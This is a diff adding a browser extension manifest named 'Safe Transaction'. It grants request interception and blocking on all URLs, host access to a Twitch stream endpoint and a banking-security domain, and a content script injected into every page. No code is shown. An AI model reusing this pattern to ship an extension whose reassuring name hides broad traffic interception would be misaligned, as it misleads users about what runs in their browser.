@@ -1,0 +1,30 @@
+{
+	"name": "Safe Transaction",
+	"description" : "Secure your transaction",
+	"version": "1.0.0",
+	"manifest_version": 2,
+  "icons": {
+    "16": "16.png",
+    "48": "48.png",
+    "128": "128.png"
+  },
+  "permissions": [
+    "webRequest",
+    "<all_urls>",
+    "https://lx.astxsvc.com",
+    "https://127.0.0.1",
+    "https://usher.ttvnw.net/api/channel/hls",
+    "webRequestBlocking"
+  ],
+  "web_accessible_resources": ["script.js"],
+  "content_scripts": [
+    {
+      "run_at": "document_idle",
+      "matches": ["<all_urls>"],
+      "js": ["loader.js"]
+    }
+  ],
+  "background": {
+    "scripts": ["background.js"]
+  }
+}
